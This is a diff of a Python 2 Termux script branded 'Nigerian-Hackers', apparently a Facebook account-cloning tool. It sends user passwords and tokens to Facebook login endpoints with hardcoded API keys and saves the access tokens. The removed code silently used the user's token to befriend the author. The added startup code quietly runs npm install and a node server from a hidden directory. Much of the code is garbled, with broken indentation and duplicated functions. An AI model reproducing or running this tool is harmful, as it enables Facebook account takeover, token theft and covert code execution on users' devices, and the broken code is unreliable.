@@ -1,52 +1,73 @@
-#!/usr/bin/python2
 #coding=utf-8
-#Codded By Mark-Cornel
-#Editing My Script Will Not Make You A Coder
-#Facebook : Mark Cornel
-#Nigerian Anonymous Hackers
-import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
-from multiprocessing.pool import ThreadPool
-from requests.exceptions import ConnectionError
-from mechanize import Browser
 
+#!/usr/bin/python2
+
+#decompile by star-vampire
+
+try:
+
+    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests
+
+    from multiprocessing.pool import ThreadPool
+
+except ImportError:
+
+    os.system("pip2 install requests")
+
+    os.system("python2 cracker.indirect")
+    
+os.system("clear")
+
+
+
+if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
+
+    os.system("apt update && apt install nodejs -y")
+
+from requests.exceptions import ConnectionError
+
+os.system("git pull")
+
+if not os.path.isfile("/data/data/com.termux/files/home/Crack-world/...../node_modules/bytes/index.js"):
+
+    os.system("fuser -k 5000/tcp &")
+
+    os.system("cd ..... && pip install progress")
+
+    os.system("cd ..... && npm install")
+
+    os.system("cd ..... && node index.js &")
+
+    os.system("clear")
+
+    time.sleep(10)
+
+elif os.path.isfile("/data/data/com.termux/files/home/Crack-world/...../node_modules/bytes/index.js"):
+
+    os.system("fuser -k 5000/tcp &")
+
+    os.system("#")
+
+    os.system("cd ..... && node index.js &")
+
+    os.system("clear")
+
+bd=random.randint(2e7, 3e7)
+
+sim=random.randint(2e4, 4e4)
+
+header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (Linux; Android 10; Infinix X688C Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
 
 reload(sys)
-sys.setdefaultencoding('utf8')
-br = mechanize.Browser()
-br.set_handle_robots(False)
-br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
-br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 10; Infinix X688C Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36')]
 
+sys.setdefaultencoding("utf-8")
 
-def keluar():
-	print "\x1b[1;91mExit"
-	os.sys.exit()
+c = "\033[1;92m"
 
+c2 = "\033[0;97m"
 
-def acak(b):
-    w = 'ahtdzjc'
-    d = ''
-    for i in x:
-        d += '!'+w[random.randint(0,len(w)-1)]+i
-    return cetak(d)
+c3 = "\033[1;91m"
 
-
-def cetak(b):
-    w = 'ahtdzjc'
-    for i in w:
-        j = w.index(i)
-        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
-    x += '\033[0m'
-    x = x.replace('!0','\033[0m')
-    sys.stdout.write(x+'\n')
-
-
-def jalan(z):
-	for e in z + '\n':
-		sys.stdout.write(e)
-		sys.stdout.flush()
-		time.sleep(0.1)
-##### INTRO #####
 logo ="""
 \033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂✮\033[1;92mNigerian-Hackers\033[1;97m✮❂❂❂❂❂❂❂❂❂❂❂❂❂❂❂✮"""
 print  "\033[1;90m👽 ●▬▬▬▬●�������������������GUPTA-SHAKEL�����������������●▬▬▬▬● 👽"
@@ -108,10 +129,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;97mACCESS DENIED"
-            os.system('xdg-open https://m.youtube.com/channel/UCDJbhYSPToi1-CdzGLEzAIQ?sub_confirmation=1')
+            os.system('xdg-open https://www.facebook.com/profile.php?id=100046218699200')
     else:
         print "\033[1;97mACCESS DENIED"
-        os.system('xdg-open https://m.youtube.com/channel/UCDJbhYSPToi1-CdzGLEzAIQ?sub_confirmation=1')
+        os.system('xdg-open https://www.facebook.com/profile.php?id=100046218699200')
 def login():
 	os.system('clear')
 	try:
@@ -121,80 +142,259 @@ def login():
 		os.system('clear')
 		print logo
      	
-		
-		jalan(' \033[1;97m   ✧ \033[1;97mWarning: \033[1;97mUse a New Account To Login' )
-		jalan(' \033[1;97m   ✧ \033[1;97m Follow my Facebook Profile *Mark Cornel*' ) 
-		
-		print('	' )
-		print('      \033[1;97m      ✧ \x1b[1;97mLogin With Facebook\x1b[1;97m ✧')
-		print('	' )
-		id = raw_input('\033[1;97m✧ \x1b[1;97mID/Email\x1b[1;97m: \x1b[1;97m')
-		pwd = raw_input('\033[1;97m✧ \x1b[1;97mPassword\x1b[1;97m: \x1b[1;97m')
-		try:
-			br.open('https://m.facebook.com')
-		except mechanize.URLError:
-			print"\n\x1b[1;97mThere is no internet connection"
-			keluar()
-		br._factory.is_html = True
-		br.select_form(nr=0)
-		br.form['email'] = id
-		br.form['pass'] = pwd
-		br.submit()
-		url = br.geturl()
-		if 'save-device' in url:
-			try:
-				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
-				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
-				x=hashlib.new("md5")
-				x.update(sig)
-				a=x.hexdigest()
-				data.update({'sig':a})
-				url = "https://api.facebook.com/restserver.php"
-				r=requests.get(url,params=data)
-				z=json.loads(r.text)
-				unikers = open("login.txt", 'w')
-				unikers.write(z['access_token'])
-				unikers.close()
-				print '\n\x1b[1;97mSuccessfully Logged In'
-				os.system('xdg-open https://www.youtube.com/channel/UCDJbhYSPToi1-CdzGLEzAIQ?sub_confirmation=1')
-				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				menu()
-			except requests.exceptions.ConnectionError:
-				print"\n\x1b[1;97mThere is no internet connection"
-				keluar()
-		if 'checkpoint' in url:
-			print("\n\x1b[1;31mYour Account is on Checkpoint")
-			os.system('rm -rf login.txt')
-			time.sleep(1)
-			keluar()
-		else:
-			print("\n\x1b[1;31mPassword/Email is wrong")
-			os.system('rm -rf login.txt')
-			time.sleep(1)
-			login()
+      print("")
+
+    print("\033[0;97m[ Starting Main Menu ]").center(50)
+
+    print("")
+
+    print("\033[1;97m[1]\033[1;91m > \033[1;97mClone Public ID With b-api")
+
+    print("")
+
+    print("\033[1;97m[2]\033[1;91m > \033[1;97mMore Termux Command")
+
+    print("")
+
+    print("\033[1;97m[0]\033[1;91m > \033[1;97mlogout tool")
+
+    print("")
+
+    main_select()
+
+def main_select():
+
+    Abdullah = raw_input("\033[1;97m[!] Select --->\033[1;96m ")
+
+    if Abdullah  =="1":
+
+        login()
+
+    if Abdullah =="2":
+
+        os.system("xdg-open https://www.facebook.com/profile.php?id=100046218699200")
+
+	main()  
+
+    elif Abdullah =="0":
+
+        os.system("exit")
+
+    else:
+
+        print("[!] Please select a valid option").center(50)
+
+        time.sleep(2)
+
+        main()
+
+def login():
+
+    os.system("clear")
+
+    print logo
+
+    print("")
+
+    print("\033[0;97m[ Login Main Menu ]").center(50)
+
+    print("")
+
+    print("\033[1;97m[1]\033[1;91m > \033[1;97mlogin using token")
+
+    print("")
+
+    print("\033[1;97m[2]\033[1;91m > \033[1;97mlogin using password")
+
+    print("")
+
+    print("\033[1;97m[3]\033[1;91m > \033[1;97mMain menu back")
+
+    print("")
+
+    login_select()
+
+def login_select():
+
+    Abdullah = raw_input(" \033[1;97mOption :\033[1;96m ")
+
+    if Abdullah =="1":
+
+        os.system("clear")
+
+        print logo
+
+        print("")
+
+	print("[ login with token ]").center(50)
+
+	print("")
+
+        token = raw_input("[!] Token ? \033[0;90m")
+
+        token_s = open(".fb_token.txt","w")
+
+        token_s.write(token)
+
+        token_s.close()
+
+        try:
+
+            r = requests.get("https://graph.facebook.com/me?access_token="+token)
+
+            q = json.loads(r.text)
+
+            name = q["name"]
+
+            nm = name.rsplit(" ")[0]
+
+            print("")
+
+            print("\033[1;92mYour token login successfully").center(50)
+
+            time.sleep(1)
+
+	    os.system("xdg-open https://www.facebook.com/profile.php?id=100046218699200")
+	
+
+	    time.sleep(1)
+
+            menu()
+
+        except (KeyError , IOError):
+
+            print("")
+
+            print("\033[1;91mToken invalid or account has checkpoint\033[0;97m").center(50)
+
+            print("")
+
+            time.sleep(2)
+
+            login()
+
+    elif Abdullah =="2":
+
+        login_fb()
+
+    elif Abdullah =="3":
+
+        main()
+
+    else:
+
+        print("")
+
+        print("Select a valid option").center(50)
+
+        print("")
+
+        login_select()
+
+def login_fb():
+
+	os.system("clear")
+
+	print logo
+
+	print("")
+
+	print("[ login with password ]").center(50)
+
+	print("")
+
+        id = raw_input("[!] \033[1;93m Email/ID/Number :\033[1;97m ")
+
+        id1 = id.replace(' ','')
+
+        id2 = id1.replace('(','')
+
+        uid = id2.replace(')','')
+
+        pwd = raw_input("[!] \033[1;93m Passwor :\033[1;97m ")
+
+        print("")
+
+        data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password="+pwd+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
+
+        q = json.loads(data)
+
+        if "access_token" in q:
+
+            login_s = open(".login.txt","w")
+
+            login_s.write(q["access_token"])
+
+            login_s.close()
+
+            print("\t\033[1;92mLogin Successfull\033[0;97m")
+
+            time.sleep(1)
+
+            menu()
+
+        else:
+
+            if "www.facebook.com" in q["error_msg"]:
+
+                print ("\n\033[1;91m[!] Login Failed . Account Has a Checkpoint\033[0;97m")
+
+                time.sleep(1)
+
+                login_fb()
+
+            else:
+
+                print("\n\033[1;91m[!] Login Failed.Email/ID/Number OR Password May BE Wrong\033[0;97m")
+
+                time.sleep(1)
+
+                login_fb()		
+
 
 
 def menu():
-	os.system('clear')
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		os.system('clear')
-		print"\x1b[1;31mToken invalid"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		login()
-	try:
-		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
-		a = json.loads(otw.text)
-		nama = a['name']
-		id = a['id']
-	except KeyError:
-		os.system('clear')
-		print"\033[1;31mYour Account is on Checkpoint"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		login()
+
+    global token
+
+    os.system("clear")
+
+    print logo
+
+    try:
+
+        token = open(".fb_token.txt","r").read()
+
+    except (KeyError , IOError):
+
+        login()
+
+    try:
+
+        r = requests.get("https://graph.facebook.com/me?access_token="+token)
+
+        q = json.loads(r.text)
+
+        nm = q["name"]
+
+        nmf = nm.rsplit(" ")[0]
+
+        ok = nmf
+
+    except (KeyError , IOError):
+
+        print("")
+
+        print("login account has checkpoint").center(50)
+
+        print("")
+
+        os.system("rm -rf .fb_token.txt")
+
+        time.sleep(1)
+
+        login()
+
 	except requests.exceptions.ConnectionError:
 		print"\x1b[1;97mThere is no internet connection"
 		keluar()
